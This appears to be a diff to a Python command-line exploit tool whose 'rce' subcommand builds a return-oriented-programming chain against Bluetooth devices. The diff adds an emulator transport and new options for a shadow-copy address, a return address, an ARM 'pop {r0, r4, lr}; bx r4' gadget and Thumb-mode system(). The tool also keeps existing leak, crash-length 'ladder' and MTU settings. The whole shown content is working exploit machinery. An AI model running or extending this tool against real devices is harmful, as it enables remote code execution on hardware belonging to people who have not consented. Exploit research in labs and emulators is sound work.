@@ -25,11 +25,16 @@ def _transport(args: argparse.Namespace) -> Transport:
         from .mock import MockTransport
 
         return MockTransport()
+    if getattr(args, "transport", "").startswith("emu:"):
+        from .emulator import EmulatorTransport
+
+        _, _, port = args.transport.partition(":")
+        return EmulatorTransport(port=int(port or 9100))
     return BumbleTransport(args.transport, args.name)
 
 
 async def _open(transport: Transport) -> None:
-    if isinstance(transport, BumbleTransport):
+    if hasattr(transport, "open"):
         await transport.open()
 
 
@@ -147,6 +152,8 @@ async def _rce(args: argparse.Namespace) -> int:
         system=args.system,
         gadget=args.gadget,
         command_addr=args.command_addr,
+        shadow=args.shadow,
+        return_addr=args.return_addr,
         align_ret=args.align_ret,
         leak_length=args.leak_length,
         scan_seconds=args.scan_seconds,
@@ -156,6 +163,8 @@ async def _rce(args: argparse.Namespace) -> int:
         write_mode=args.write_mode,
         mtu=args.mtu,
         gadget_words=args.gadget_words,
+        gadget_lr=args.gadget_lr,
+        system_thumb=args.system_thumb,
         hello=args.hello,
         ladder=args.ladder,
         leak=not args.no_leak,
@@ -279,6 +288,8 @@ def build_parser() -> argparse.ArgumentParser:
     rce.add_argument("--system", type=lambda value: int(value, 0))
     rce.add_argument("--gadget", type=lambda value: int(value, 0))
     rce.add_argument("--command-addr", type=lambda value: int(value, 0))
+    rce.add_argument("--shadow", type=lambda value: int(value, 0), help="address of the mirror copy (action_shadow)")
+    rce.add_argument("--return-addr", type=lambda value: int(value, 0))
     rce.add_argument("--align-ret", type=lambda value: int(value, 0))
     rce.add_argument("--leak-length", type=int, default=253)
     rce.add_argument("--scan-seconds", type=float, default=20)
@@ -288,6 +299,8 @@ def build_parser() -> argparse.ArgumentParser:
     rce.add_argument("--write-mode", default="auto", choices=["auto", "command", "prepare"])
     rce.add_argument("--mtu", type=int, default=517)
     rce.add_argument("--gadget-words", type=int, default=2)
+    rce.add_argument("--gadget-lr", type=lambda value: int(value, 0), help="pop {r0, r4, lr}; bx r4")
+    rce.add_argument("--system-thumb", action="store_true", help="system() is Thumb code")
     rce.add_argument("--hello", action="store_true", help="send a 1-byte stop request first")
     rce.add_argument("--ladder", action="store_true", help="find the crash length before the chain")
     rce.add_argument("--no-leak", action="store_true", help="skip the EIR/leak stage")
